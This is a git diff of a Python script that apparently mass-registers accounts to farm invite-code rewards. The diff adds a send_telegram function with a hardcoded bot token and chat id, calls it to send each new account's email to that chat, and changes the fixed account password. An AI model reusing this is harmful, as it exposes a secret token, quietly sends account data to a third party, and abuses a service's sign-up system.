@@ -9,8 +9,16 @@ import uuid
 import image
 import recognize
 from rich import print_json
-#test11
+import requests
 
+def send_telegram(message):
+    TOKEN = "6855338190:AAHBUMz6IMCeKII140ck136E0EhCQxdDbsI"
+    chat_id = "591217495"
+    # message = "hello from your telegram bot"
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+    requests.get(url).json()
+    print('信息已发送至telegram')
+    
 DEBUG_MODE = False  # Debug模式，是否打印请求返回信息
 # PROXY = input('请输入代理，如不需要直接回车:')  # 代理，如果多次出现IP问题可尝试将自己所用的魔法设置为代理。例如：使用clash则设置为 'http://127.0.0.1:7890'
 PROXY = ''
@@ -367,7 +375,7 @@ async def signup(xid, mail, code, verification_token):
         "email": mail,
         "verification_code": code,
         "verification_token": verification_token,
-        "password": "linyuan666",
+        "password": "he123456#",
         "client_id": "YvtoWO6GNHiuCl7x"
     }
     headers = {
@@ -630,7 +638,8 @@ async def main():
         if activation['add_days'] == 5:
             print(f'邀请码: {incode} ==> 邀请成功, 用时: {run_time} 秒')
             print(f'邮箱: {mail}')
-            print(f'密码: linyuan666')
+            print(f'密码: he123456#')
+            send_telegram(mail)
             return
         else:
             print(f'邀请码: {incode} ==> 邀请失败, 用时: {run_time} 秒')
